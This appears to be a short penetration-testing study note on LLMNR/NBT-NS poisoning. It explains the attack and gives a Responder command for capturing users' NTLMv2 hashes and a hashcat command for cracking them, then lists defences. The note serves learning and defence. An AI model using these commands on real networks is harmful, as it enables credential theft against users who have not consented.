# LLMNR Poisoning

LLMNR (previously NBT-NS) is a way of resolving host when DNS fails to do so. When appropriately responded to, it responds back with a user's **username** and **NTLMv2 hash**.

### Attack Procedure
- Set up `responder` to listen
		- `(sudo) responder -I <Network Device> -rdw`
- Wait for a certain event to occur (triggers when someone tries to access a non-existing/invalid resource on the network)
- Capture hashes
- Attempt to crack the hashes
		- `(sudo) hashcat -m 5600 <hash> <wordlist>`

### Defensive measures
- Disable LLMNR/NBT-NS on the network
- If cannot be disabled;
	- Require Network Access Control
	- Require strong/complex passwords
